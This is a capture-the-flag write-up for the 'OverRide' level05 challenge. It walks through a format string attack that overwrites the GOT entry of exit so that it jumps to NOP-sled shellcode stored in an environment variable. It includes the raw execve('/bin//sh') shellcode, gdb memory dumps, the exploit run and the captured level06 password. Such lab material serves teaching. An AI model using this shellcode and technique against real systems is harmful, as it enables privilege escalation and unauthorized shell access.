# level05

after login to `level05` user, there's an `level05` executable in the home directory.

the program promts for input, it prints it back and exits.

after disassembling it, you will find it at [source.c](source.c).

it uses `printf` to print the user input without format string specifiers, which makes it vulnerable to format string attacks.

then it uses exit at the end, we will focus on modify the GOT address of exit to point to a shellcode that we will inject it in the environment.

we will inject a shellcode in the environment then we will retrieve it's address with gdb.

first let's inject our shellcode.

```sh
export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

our shellcode will have 200 nop-sled characters to make it flexible if the memory alignment changed will still work, this way we will make sure our payload work in both gdb and outside it.

let's use gdb to retrieve the address.

```sh
level05@OverRide:~$ gdb ./level05
(gdb) b * 0x08048513 # create a breakpoint at exit call
(gdb) r # we will run the program to load the environemt variables into the stack
Starting program: /home/users/level05/level05
f
f

Breakpoint 1, 0x08048513 in main ()
(gdb) x/1000wx $esp
0xffffd590:     0x00000000      0x00000064      0xf7fcfac0      0xf7ec3b11
0xffffd5a0:     0xffffd5df      0xffffd5de      0x00000000      0xffffffff
0xffffd5b0:     0xffffd664      0x00000000      0x00000a66      0xf7e5ec03
0xffffd5c0:     0x08048271      0x0000004d      0x002c307d      0x00000001
0xffffd5d0:     0xffffd7e6      0x0000002f      0xffffd62c      0xf7fceff4
0xffffd5e0:     0x08048520      0x080497c8      0x00000001      0x08048321
0xffffd5f0:     0xf7fcf3e4      0x00008000      0x080497c8      0x08048541
0xffffd600:     0xffffffff      0xf7e5ed56      0xf7fceff4      0xf7e5ede5
0xffffd610:     0xf7feb620      0x00000000      0x08048529      0x00000002
0xffffd620:     0xf7fceff4      0x00000000      0x00000000      0xf7e45513
0xffffd630:     0x00000001      0xffffd6c4      0xffffd6cc      0xf7fd3000
0xffffd640:     0x00000000      0xffffd61c      0xffffd6cc      0x00000000
0xffffd650:     0x08048230      0xf7fceff4      0x00000000      0x00000000
0xffffd660:     0x00000000      0x664bbb05      0x514e7f15      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000001      0x08048390
0xffffd680:     0x00000000      0xf7ff0a50      0xf7e45429      0xf7ffcff4
0xffffd690:     0x00000001      0x08048390      0x00000000      0x080483b1
0xffffd6a0:     0x08048444      0x00000001      0xffffd6c4      0x08048520
---Type <return> to continue, or q <return> to quit---
0xffffd6b0:     0x08048590      0xf7feb620      0xffffd6bc      0xf7ffd918
0xffffd6c0:     0x00000001      0xffffd7e6      0x00000000      0xffffd802
0xffffd6d0:     0xffffd8ea      0xffffd8fa      0xffffd90e      0xffffd931
0xffffd6e0:     0xffffd944      0xffffd951      0xffffde72      0xffffde7d
0xffffd6f0:     0xffffdeca      0xffffdee1      0xffffdef0      0xffffdf08
0xffffd700:     0xffffdf19      0xffffdf22      0xffffdf3b      0xffffdf43
0xffffd710:     0xffffdf55      0xffffdf65      0xffffdf9a      0xffffdfba
0xffffd720:     0x00000000      0x00000020      0xf7fdb430      0x00000021
0xffffd730:     0xf7fdb000      0x00000010      0x178bfbfd      0x00000006
0xffffd740:     0x00001000      0x00000011      0x00000064      0x00000003
0xffffd750:     0x08048034      0x00000004      0x00000020      0x00000005
0xffffd760:     0x00000008      0x00000007      0xf7fdc000      0x00000008
0xffffd770:     0x00000000      0x00000009      0x08048390      0x0000000b
0xffffd780:     0x000003ed      0x0000000c      0x000003ed      0x0000000d
0xffffd790:     0x000003ed      0x0000000e      0x000003ed      0x00000017
0xffffd7a0:     0x00000000      0x00000019      0xffffd7cb      0x0000001f
0xffffd7b0:     0xffffdfdc      0x0000000f      0xffffd7db      0x00000000
0xffffd7c0:     0x00000000      0x00000000      0x00000000      0xed042a47
---Type <return> to continue, or q <return> to quit---
0xffffd7d0:     0x437d4cf3      0xb3895bb6      0x69e4d4da      0x00363836
0xffffd7e0:     0x00000000      0x682f0000      0x2f656d6f      0x72657375
0xffffd7f0:     0x656c2f73      0x306c6576      0x656c2f35      0x306c6576
0xffffd800:     0x48530035      0x434c4c45      0x3d45444f      0x90909090 # our shellcode start here as you can see the nop-sled characters
0xffffd810:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd820:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd830:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd850:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd860:     0x90909090      0x90909090      0x90909090      0x90909090 # let's pick an address from the middle of our shell so if the memory moved we will make sure we will always spawn at a nop-sled address
0xffffd870:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd880:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd890:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8d0:     0x90909090      0x99580b6a      0x2f2f6852      0x2f686873
0xffffd8e0:     0x896e6962      0xcdc931e3      0x48530080      0x3d4c4c45
---Type <return> to continue, or q <return> to quit---
0xffffd8f0:     0x6e69622f      0x7361622f      0x45540068      0x783d4d52
0xffffd900:     0x6d726574      0x3635322d      0x6f6c6f63      0x53530072
0xffffd910:     0x4c435f48      0x544e4549      0x3239313d      0x3836312e
0xffffd920:     0x2e34362e      0x34362031      0x20303239      0x32343234
0xffffd930:     0x48535300      0x5954545f      0x65642f3d      0x74702f76
0xffffd940:     0x00332f73      0x52455355      0x76656c3d      0x35306c65
0xffffd950:     0x5f534c00      0x4f4c4f43      0x723d5352      0x3a303d73
0xffffd960:     0x303d6964      0x34333b31      0x3d6e6c3a      0x333b3130
0xffffd970:     0x686d3a36      0x3a30303d      0x343d6970      0x33333b30
0xffffd980:     0x3d6f733a      0x333b3130      0x6f643a35      0x3b31303d
0xffffd990:     0x623a3533      0x30343d64      0x3b33333b      0x633a3130
0xffffd9a0:     0x30343d64      0x3b33333b      0x6f3a3130      0x30343d72
0xffffd9b0:     0x3b31333b      0x733a3130      0x37333d75      0x3a31343b
0xffffd9c0:     0x333d6773      0x33343b30      0x3d61633a      0x343b3033
0xffffd9d0:     0x77743a31      0x3b30333d      0x6f3a3234      0x34333d77
0xffffd9e0:     0x3a32343b      0x333d7473      0x34343b37      0x3d78653a
0xffffd9f0:     0x333b3130      0x2e2a3a32      0x3d726174      0x333b3130
0xffffda00:     0x2e2a3a31      0x3d7a6774      0x333b3130      0x2e2a3a31
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb)
```

so now we have our target address `0xffffd860`.

now we need to find the GOT address of exit function, we can use `objdump -R` to find it.

```sh
level05@OverRide:~$ objdump -R ./level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

i've created a python script (you can find it at [source.c](./Resources/exploit.py)) that will automate the exploit, the script will modify each byte of the exit GOT address to point to our shellcode address using format string vulnerability. we changed byte by byte because if we tried to change all 4 bytes at once it will take forever to print the required number of characters or it may print nothing if the required number of characters more than the io buffer size.

```sh
(gdb) r < <(./exploit.py)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level05/level05 < <(./exploit.py)
                                                                              64                                                                                                                f7fcfac0                               f7ec3b11

Breakpoint 1, 0x08048513 in main ()
(gdb) c
Continuing.
process 5455 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
(gdb)
```

our exploit worked and we spawned a shell, but gdb couldn't spawn it properly.

let's try it outside gdb.

```sh
level05@OverRide:~$ (./exploit.py ; cat) | ./level05
                                                                              64                                                                                                                f7fcfac0                               f7ec3b11
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

we got the shell and got the flag.
